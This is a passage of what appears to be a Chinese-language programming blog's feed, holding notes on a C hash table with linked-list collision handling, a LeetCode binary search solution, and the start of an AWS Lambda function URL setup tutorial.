hash_table.<span class="built_in">erase</span>(name) &gt; <span class="number">0</span>; <span class="comment">// True if element was removed, false if key didn&#x27;t exist</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="添加碰撞處理"><a href="#添加碰撞處理" class="headerlink" title="添加碰撞處理"></a>添加碰撞處理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">person</span> *<span class="title">next</span>;</span> <span class="comment">// pointer to the next person in the list</span></span><br><span class="line">&#125; person;</span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    hash_table_delete(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        hash_value += name[i];</span><br><span class="line">        hash_value = (hash_value * name[i]) % TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        hash_table[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash_table[i] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>, i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            person *tmp = hash_table[i];</span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>, i, tmp-&gt;name);</span><br><span class="line">                tmp = tmp-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Insert at the head of the list</span></span><br><span class="line">    p-&gt;next = hash_table[index];</span><br><span class="line">    hash_table[index] = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lookup a person in the hash table by name</span></span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete a person from the hash table by name</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    person *prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        prev = tmp;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        hash_table[index] = tmp-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev-&gt;next = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>當發生碰撞時，這裡使用 close addressing (即 linked list) 來解決問題。具體實現如下：</p><p>Linked List：</p><p>每個 person 結構中包含一個 next 指標，以形成 linked list。<br><strong>Hash Table 的每個槽 ( <code>hash_table[index]</code> ) 都是一個 linked list 的 Head Pointer。</strong></p><ul><li>插入操作：</li></ul><p><code>hash_table_insert</code> 函數在計算出索引後，將新的 person 插入到對應索引的 linked list 的頭部。</p><ul><li>查找操作：</li></ul><p><code>hash_table_lookup</code> 函數 traverse 指定索引的 linked list，查找特定名稱的 person。</p><ul><li>刪除操作：</li></ul><p><code>hash_table_delete</code> 函數在指定索引的 linked list 中查找並刪除特定的 person，並維持 linked list 的結構。<br>這樣的實現方法使用了 linked list 來解決 Hash Table 中的哈希碰撞問題，保證在發生碰撞時依然能正確地插入、查找和刪除資料。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a><br>[2] <a href="https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table">https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table</a><br>[3] <a href="https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/">https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/</a><br>[4] <a href="https://haogroot.com/2022/06/19/how-to-design-hash-table/">https://haogroot.com/2022/06/19/how-to-design-hash-table/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> hash table </tag>
            
            <tag> complexity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元搜尋法 | Easy | LeetCode#704 Binary Search</title>
      <link href="/posts/22bf447e.html"/>
      <url>/posts/22bf447e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/BS_Question.jpeg"></p><p>題目中有一個整數陣列 nums, 這個陣列是以排序的陣列，並且在這當中想要找到 target 這個元素的 index, 如果沒找到就回傳 -1。並且要求所實現的演算法其實時間複雜度為 $O(Log n)$</p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的作法"><a href="#我的作法" class="headerlink" title="我的作法"></a>我的作法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binary search</span></span><br><span class="line">    <span class="comment">// 1. find lower index and high index according to the length of array</span></span><br><span class="line">    <span class="comment">// 2  calculate middle value</span></span><br><span class="line">    <span class="comment">// 3. update low and high value</span></span><br><span class="line">    <span class="comment">// 4. again calcuate the new middle value until derive the target value or return -1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">    <span class="comment">// needs to consider the situation that the middle number is not an even number</span></span><br><span class="line">    mid = (<span class="type">int</span>)((low + high)/<span class="number">2.0</span>); </span><br><span class="line">    <span class="comment">// need to find the lower section of array</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &gt; target)&#123; </span><br><span class="line">            high = mid<span class="number">-1</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">        low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// find value</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊使用了 Binary Search 的標準做法，<strong>首先設定進行切分的中間值 mid，透過 low 以及 high 去取平均來找中間值。</strong> 接著我們開始判斷狀況:</p><ul><li>當 <code>nums[mid] &gt; target:</code> 這就代表中間值大於要找的target 值，<strong>也就是說可以把 mid 的右側部分捨棄，僅找左側部分</strong>，因此需要調整 high 的值，來縮小查找範圍<ul><li><code>high = mid -1;</code></li></ul></li><li>當 <code>nums[mid] &lt; target:</code> 這就代表中間值小於要找的target 值，<strong>也就是說可以把 mid 的左側部分捨棄，僅找右側部分</strong>，因此需要調整 low 的值，來縮小查找範圍</li><li><code>low = mid +1;</code></li><li>第三種狀況就是找到 <code>target</code> 值就在陣列中，即回傳 mid 值</li><li>while 迴圈的中止條件會是 <code>low &gt; high</code>，這就代表已經找太多遍，確定陣列中沒有target值了，直接結束迴圈並且 <code>return -1</code></li></ul><blockquote><p>注意，在中間值時候建議改寫成 <code>mid =  low + (high -  low)/2</code> 這樣做可以避免 high 跟 low 都是較大的數字，相加導致溢位的問題</p></blockquote><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/BS_Result.png"></p><h2 id="其他做法-求上界"><a href="#其他做法-求上界" class="headerlink" title="其他做法 -  求上界"></a>其他做法 -  求上界</h2><p><img src="/img/LeetCode/BS_upper.png"></p><p>這是在 LeetCode 解答區看到的其他做法，與其直接找到 Target 本身，<strong>不如去找能夠 Target 在這個陣列中能夠插入的點</strong></p><p>這個解法中首先定義了能被插入的區塊，如同圖片中描述的一樣，如一個陣列假設是 <code>[-7,-4,3,9,9,9,12]</code> 那他最大能夠插入的位置會是在 <code>9</code> 與 <code>12</code>之間，而他最小能夠插入的位置會是 <code>3</code> 和 <code>9</code> 之間。</p><p>首先 一樣需要計算中間值的位置，接著做判斷時分別考慮:</p><ul><li>當 <code>nums[mid] &lt; target:</code> 這就代表中間值小於要找的target 值，這時代表可能插入的位置在 mid 的右側，因此調整 low 的範圍，繼續找上界</li><li><code>low = mid +1;</code></li><li>當 <code>nums[mid] == target:</code> 這就代表中間值等於要找的target 值，時代表可能插入的位置在 mid 的右側，因此調整 low 的範圍，繼續找上界</li><li><code>low = mid +1;</code></li><li>當 <code>nums[mid] &gt; target:</code> 這就代表中間值大於要找的target 值，時代表可能插入的位置在 mid 的左側，因此調整 high 的範圍，繼續找上界，這時 mid 也可能是可插入的位置，因此 high 設為 mid<ul><li><code>high = mid;</code></li></ul></li></ul><p>一旦迴圈結束， <strong><code>high</code> 代表的意義是插入的位置， <code>low -1</code> 代表的是不大於 <code>target</code> 的最大元素</strong> 所以結束後會去需要檢查 <code>nums[low-1]</code> 是否等於 <code>target</code>，有就回傳 low-1 沒有就回傳 -1</p><p>演算法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// array init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Approach-2 Find Upper Bound</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line"></span><br><span class="line">        mid = low + (<span class="type">int</span>)((high-low)/<span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= target)&#123;</span><br><span class="line">            low = mid +<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( low &gt; <span class="number">0</span> &amp;&amp; target == nums[low<span class="number">-1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> low <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( nums[low] == target &amp;&amp; low ==<span class="number">0</span> )&#123; <span class="comment">// edge case</span></span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( high == numsSize<span class="number">-1</span> &amp;&amp; target == nums[high])&#123; <span class="comment">//edge case</span></span><br><span class="line">        <span class="keyword">return</span> high;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="為什麼這種方法能找到目標值"><a href="#為什麼這種方法能找到目標值" class="headerlink" title="為什麼這種方法能找到目標值?"></a>為什麼這種方法能找到目標值?</h3><ul><li><strong>合併條件</strong>：在這種方法中，我們將 nums[mid] &lt; target 和 nums[mid] &#x3D;&#x3D; target 這兩個條件合併了，因為不管是小於還是等於，目標值的插入位置都應該在 mid 的右側。所以這時候都將 left 設為 mid + 1。</li><li><strong>保持有效範圍</strong>：如果 nums[mid] &gt; target，說明目標值應該在 mid 及其左側，所以我們將 right 設為 mid，而不是 mid - 1，這樣我們保留了 mid 作為一個可能的位置。</li><li><strong>循環結束判斷</strong>：當 left 和 right 相等時，循環結束，left 即為目標值的插入位置。如果目標值在陣列中存在，那麼 left - 1 即為目標值的最後一個位置。這時候我們只需要檢查 nums[left - 1] 是否等於目標值即可。</li></ul><h3 id="特殊狀況"><a href="#特殊狀況" class="headerlink" title="特殊狀況"></a>特殊狀況</h3><ul><li>陣列中所有元素都大於目標值：這種情況下，最終 left 會等於 0，此時說明目標值不存在於陣列中。</li><li>陣列中所有元素都小於目標值：這種情況下，最終 left 會等於陣列長度，目標值應該插入在陣列的最後位置。</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/BS_upper_result.png"></p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>執行步驟數 N -&gt; 1&#x2F;2 N -&gt; 1&#x2F;4 N -&gt; 1&#x2F;8 N … 隨著 $Log n$ 函數收斂到定值</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立 Lambda 函數 URL 的步驟</title>
      <link href="/posts/421a206a.html"/>
      <url>/posts/421a206a.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Lambda-URL"><a href="#甚麼是-Lambda-URL" class="headerlink" title="甚麼是 Lambda URL ?"></a>甚麼是 Lambda URL ?</h1><blockquote><p>官方定義: 函數 URL 是 Lambda 函數專用的 HTTP(S) 端點。您可以透過 Lambda 主控台或 Lambda API 建立及設定函數 URL。當您建立函數 URL 時，Lambda 會自動為您產生不重複的 URL 端點。函數 URL 一旦建立，其 URL 端點便永遠不會變更。</p></blockquote><p>函數 URL 端點的格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;url-id&gt;.lambda-url.&lt;region&gt;.on.aws</span><br></pre></td></tr></table></figure><p>要特別注意的是，某些region並不支援使用 function URL，這時可能就要用老方法: API Gateway + Lambda Integration</p><h2 id="存取控制"><a href="#存取控制" class="headerlink" title="存取控制"></a>存取控制</h2><p>在建立 function URL 的時候可以透過 <code>AuthType</code> 參數，來決定 Lambda 如何對 funcion URL 的請求執行身分驗證或授權</p><p>AuthType 選項:</p><ul><li><code>AWS_IAM</code> : 　如果想讓已完成身分驗證的使用者或Role透過function URL 呼叫你的函數，就要選 <code>AWS_IAM</code></li><li><code>NONE</code>:   Lambda 不會在呼叫函數前執行任何身分驗證，但Lambda Function 的Resource Policy永遠有效，還是必須要授予存取權，Function URL 才能接收請求。</li></ul><blockquote><p>細節可以參考<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-auth.html">這裡</a></p></blockquote><h1 id="如何建立-Lambda-URL"><a href="#如何建立-Lambda-URL" class="headerlink" title="如何建立 Lambda URL?"></a>如何建立 Lambda URL?</h1><h2 id="建立-Execution-Role"><a href="#建立-Execution-Role" class="headerlink" title="建立 Execution Role"></a>建立 Execution Role</h2><p>－ 建立一個具有 <code>AWSLambdaBasicExecutionRole</code> 權限 的 Role</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/execution_role.png"></p><ul><li>註記 role ARN:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Role ARN: arn:aws:iam::1XXXXXXXXXXX:role/Lambda-URL_Role</span><br></pre></td></tr></table></figure></li></ul><h2 id="建立具有函數-URL-的-Lambda-函數-zip-封存檔"><a href="#建立具有函數-URL-的-Lambda-函數-zip-封存檔" class="headerlink" title="建立具有函數 URL 的 Lambda 函數 (.zip 封存檔)"></a>建立具有函數 URL 的 Lambda 函數 (.zip 封存檔)</h2><ol><li>Write Function Code</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="keyword">async</span> (event) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">const</span> product = body.<span class="property">num1</span> * body.<span class="property">num2</span>;</span><br><span class="line">    <span class="keyword">const</span> response = &#123;</span><br><span class="line">        <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&quot;The product of &quot;</span> + body.<span class="property">num1</span> + <span class="string">&quot; and &quot;</span> + body.<span class="property">num2</span> + <span class="string">&quot; is &quot;</span> + product,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="2"><li>Create deployment packages</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip function.zip index.js</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 